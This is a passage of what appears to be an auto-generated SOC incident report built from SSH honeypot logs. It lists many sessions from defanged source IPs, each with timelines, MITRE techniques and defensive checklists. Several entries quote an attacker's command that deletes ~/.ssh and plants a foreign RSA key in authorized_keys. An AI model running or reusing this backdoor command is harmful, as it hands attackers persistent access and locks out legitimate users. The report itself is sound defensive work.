- [ ] Block `120.48.147[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b25899a4eff7

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:07 |
| **Last Seen** | 2026-04-10 19:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:07:12` | `cowrie.session.connect` |
| `2026-04-10 19:07:12` | `cowrie.client.version` |
| `2026-04-10 19:07:12` | `cowrie.client.kex` |
| `2026-04-10 19:07:13` | `cowrie.login.success` |
| `2026-04-10 19:07:13` | `cowrie.session.params` |
| `2026-04-10 19:07:13` | `cowrie.command.input` |
| `2026-04-10 19:07:13` | `cowrie.command.failed` |
| `2026-04-10 19:07:13` | `cowrie.log.closed` |
| `2026-04-10 19:07:13` | `cowrie.session.params` |
| `2026-04-10 19:07:13` | `cowrie.command.input` |
| `2026-04-10 19:07:13` | `cowrie.session.file_download` |
| `2026-04-10 19:07:13` | `cowrie.log.closed` |
| `2026-04-10 19:07:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ea0592bd699

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:07 |
| **Last Seen** | 2026-04-10 19:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:07:15` | `cowrie.session.connect` |
| `2026-04-10 19:07:15` | `cowrie.client.version` |
| `2026-04-10 19:07:15` | `cowrie.client.kex` |
| `2026-04-10 19:07:16` | `cowrie.login.success` |
| `2026-04-10 19:07:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae12588ae6f1

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:09 |
| **Last Seen** | 2026-04-10 19:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:09:06` | `cowrie.session.connect` |
| `2026-04-10 19:09:06` | `cowrie.client.version` |
| `2026-04-10 19:09:06` | `cowrie.client.kex` |
| `2026-04-10 19:09:07` | `cowrie.login.success` |
| `2026-04-10 19:09:07` | `cowrie.session.params` |
| `2026-04-10 19:09:07` | `cowrie.command.input` |
| `2026-04-10 19:09:07` | `cowrie.command.failed` |
| `2026-04-10 19:09:07` | `cowrie.log.closed` |
| `2026-04-10 19:09:08` | `cowrie.session.params` |
| `2026-04-10 19:09:08` | `cowrie.command.input` |
| `2026-04-10 19:09:08` | `cowrie.session.file_download` |
| `2026-04-10 19:09:08` | `cowrie.log.closed` |
| `2026-04-10 19:09:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-565df10133ff

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:09 |
| **Last Seen** | 2026-04-10 19:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:09:10` | `cowrie.session.connect` |
| `2026-04-10 19:09:10` | `cowrie.client.version` |
| `2026-04-10 19:09:10` | `cowrie.client.kex` |
| `2026-04-10 19:09:11` | `cowrie.login.success` |
| `2026-04-10 19:09:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b323c980722

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:10 |
| **Last Seen** | 2026-04-10 19:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:10:59` | `cowrie.session.connect` |
| `2026-04-10 19:10:59` | `cowrie.client.version` |
| `2026-04-10 19:10:59` | `cowrie.client.kex` |
| `2026-04-10 19:11:00` | `cowrie.login.success` |
| `2026-04-10 19:11:00` | `cowrie.session.params` |
| `2026-04-10 19:11:00` | `cowrie.command.input` |
| `2026-04-10 19:11:00` | `cowrie.command.failed` |
| `2026-04-10 19:11:00` | `cowrie.log.closed` |
| `2026-04-10 19:11:00` | `cowrie.session.params` |
| `2026-04-10 19:11:00` | `cowrie.command.input` |
| `2026-04-10 19:11:01` | `cowrie.session.file_download` |
| `2026-04-10 19:11:01` | `cowrie.log.closed` |
| `2026-04-10 19:11:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b13ad9cc44f3

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:11 |
| **Last Seen** | 2026-04-10 19:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:11:03` | `cowrie.session.connect` |
| `2026-04-10 19:11:03` | `cowrie.client.version` |
| `2026-04-10 19:11:03` | `cowrie.client.kex` |
| `2026-04-10 19:11:03` | `cowrie.login.success` |
| `2026-04-10 19:11:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e44d05626e5

| Field | Detail |
|---|---|
| **Source IP** | `120.48.147[.]81` |
| **First Seen** | 2026-04-10 19:11 |
| **Last Seen** | 2026-04-10 19:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:11:11` | `cowrie.session.connect` |
| `2026-04-10 19:11:11` | `cowrie.client.version` |
| `2026-04-10 19:11:12` | `cowrie.client.kex` |
| `2026-04-10 19:11:12` | `cowrie.login.success` |
| `2026-04-10 19:11:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.147[.]81` to AbuseIPDB if not already reported
- [ ] Block `120.48.147[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4644c27d118

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:16 |
| **Last Seen** | 2026-04-10 19:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:16:34` | `cowrie.session.connect` |
| `2026-04-10 19:16:34` | `cowrie.client.version` |
| `2026-04-10 19:16:34` | `cowrie.client.kex` |
| `2026-04-10 19:16:34` | `cowrie.login.success` |
| `2026-04-10 19:16:35` | `cowrie.session.params` |
| `2026-04-10 19:16:35` | `cowrie.command.input` |
| `2026-04-10 19:16:35` | `cowrie.command.failed` |
| `2026-04-10 19:16:35` | `cowrie.log.closed` |
| `2026-04-10 19:16:35` | `cowrie.session.params` |
| `2026-04-10 19:16:35` | `cowrie.command.input` |
| `2026-04-10 19:16:35` | `cowrie.session.file_download` |
| `2026-04-10 19:16:35` | `cowrie.log.closed` |
| `2026-04-10 19:16:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba4902f2c6cc

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:16 |
| **Last Seen** | 2026-04-10 19:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:16:37` | `cowrie.session.connect` |
| `2026-04-10 19:16:37` | `cowrie.client.version` |
| `2026-04-10 19:16:37` | `cowrie.client.kex` |
| `2026-04-10 19:16:38` | `cowrie.login.success` |
| `2026-04-10 19:16:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-959a5ebab640

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:20 |
| **Last Seen** | 2026-04-10 19:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:20:24` | `cowrie.session.connect` |
| `2026-04-10 19:20:24` | `cowrie.client.version` |
| `2026-04-10 19:20:24` | `cowrie.client.kex` |
| `2026-04-10 19:20:25` | `cowrie.login.success` |
| `2026-04-10 19:20:25` | `cowrie.session.params` |
| `2026-04-10 19:20:25` | `cowrie.command.input` |
| `2026-04-10 19:20:25` | `cowrie.command.failed` |
| `2026-04-10 19:20:25` | `cowrie.log.closed` |
| `2026-04-10 19:20:25` | `cowrie.session.params` |
| `2026-04-10 19:20:25` | `cowrie.command.input` |
| `2026-04-10 19:20:25` | `cowrie.session.file_download` |
| `2026-04-10 19:20:25` | `cowrie.log.closed` |
| `2026-04-10 19:20:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9238f668a39a

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:20 |
| **Last Seen** | 2026-04-10 19:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:20:28` | `cowrie.session.connect` |
| `2026-04-10 19:20:28` | `cowrie.client.version` |
| `2026-04-10 19:20:28` | `cowrie.client.kex` |
| `2026-04-10 19:20:28` | `cowrie.login.success` |
| `2026-04-10 19:20:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d27beb7ac02c

| Field | Detail |
|---|---|
| **Source IP** | `223.17.5[.]126` |
| **First Seen** | 2026-04-10 19:22 |
| **Last Seen** | 2026-04-10 19:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:22:04` | `cowrie.session.connect` |
| `2026-04-10 19:22:04` | `cowrie.client.version` |
| `2026-04-10 19:22:04` | `cowrie.client.kex` |
| `2026-04-10 19:22:05` | `cowrie.login.success` |
| `2026-04-10 19:22:05` | `cowrie.session.params` |
| `2026-04-10 19:22:05` | `cowrie.command.input` |
| `2026-04-10 19:22:05` | `cowrie.command.failed` |
| `2026-04-10 19:22:05` | `cowrie.log.closed` |
| `2026-04-10 19:22:05` | `cowrie.session.params` |
| `2026-04-10 19:22:05` | `cowrie.command.input` |
| `2026-04-10 19:22:05` | `cowrie.session.file_download` |
| `2026-04-10 19:22:05` | `cowrie.log.closed` |
| `2026-04-10 19:22:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.17.5[.]126` to AbuseIPDB if not already reported
- [ ] Block `223.17.5[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50194c78fbd0

| Field | Detail |
|---|---|
| **Source IP** | `223.17.5[.]126` |
| **First Seen** | 2026-04-10 19:22 |
| **Last Seen** | 2026-04-10 19:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:22:07` | `cowrie.session.connect` |
| `2026-04-10 19:22:07` | `cowrie.client.version` |
| `2026-04-10 19:22:07` | `cowrie.client.kex` |
| `2026-04-10 19:22:08` | `cowrie.login.success` |
| `2026-04-10 19:22:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.17.5[.]126` to AbuseIPDB if not already reported
- [ ] Block `223.17.5[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45eb5ef97b33

| Field | Detail |
|---|---|
| **Source IP** | `103.82.37[.]117` |
| **First Seen** | 2026-04-10 19:23 |
| **Last Seen** | 2026-04-10 19:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:23:31` | `cowrie.session.connect` |
| `2026-04-10 19:23:31` | `cowrie.client.version` |
| `2026-04-10 19:23:31` | `cowrie.client.kex` |
| `2026-04-10 19:23:31` | `cowrie.login.success` |
| `2026-04-10 19:23:31` | `cowrie.session.params` |
| `2026-04-10 19:23:31` | `cowrie.command.input` |
| `2026-04-10 19:23:31` | `cowrie.command.failed` |
| `2026-04-10 19:23:32` | `cowrie.log.closed` |
| `2026-04-10 19:23:32` | `cowrie.session.params` |
| `2026-04-10 19:23:32` | `cowrie.command.input` |
| `2026-04-10 19:23:32` | `cowrie.session.file_download` |
| `2026-04-10 19:23:32` | `cowrie.log.closed` |
| `2026-04-10 19:23:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.37[.]117` to AbuseIPDB if not already reported
- [ ] Block `103.82.37[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da974c886cc4

| Field | Detail |
|---|---|
| **Source IP** | `103.82.37[.]117` |
| **First Seen** | 2026-04-10 19:23 |
| **Last Seen** | 2026-04-10 19:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:23:34` | `cowrie.session.connect` |
| `2026-04-10 19:23:34` | `cowrie.client.version` |
| `2026-04-10 19:23:34` | `cowrie.client.kex` |
| `2026-04-10 19:23:34` | `cowrie.login.success` |
| `2026-04-10 19:23:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.37[.]117` to AbuseIPDB if not already reported
- [ ] Block `103.82.37[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-962b3e67ccfd

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-04-10 19:26 |
| **Last Seen** | 2026-04-10 19:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:26:36` | `cowrie.session.connect` |
| `2026-04-10 19:26:36` | `cowrie.client.version` |
| `2026-04-10 19:26:36` | `cowrie.client.kex` |
| `2026-04-10 19:26:36` | `cowrie.login.success` |
| `2026-04-10 19:26:36` | `cowrie.session.params` |
| `2026-04-10 19:26:36` | `cowrie.command.input` |
| `2026-04-10 19:26:36` | `cowrie.command.failed` |
| `2026-04-10 19:26:36` | `cowrie.log.closed` |
| `2026-04-10 19:26:36` | `cowrie.session.params` |
| `2026-04-10 19:26:36` | `cowrie.command.input` |
| `2026-04-10 19:26:36` | `cowrie.session.file_download` |
| `2026-04-10 19:26:36` | `cowrie.log.closed` |
| `2026-04-10 19:26:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e924eeebd68f

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-04-10 19:26 |
| **Last Seen** | 2026-04-10 19:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:26:38` | `cowrie.session.connect` |
| `2026-04-10 19:26:38` | `cowrie.client.version` |
| `2026-04-10 19:26:38` | `cowrie.client.kex` |
| `2026-04-10 19:26:38` | `cowrie.login.success` |
| `2026-04-10 19:26:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0183bc07726a

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:28 |
| **Last Seen** | 2026-04-10 19:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
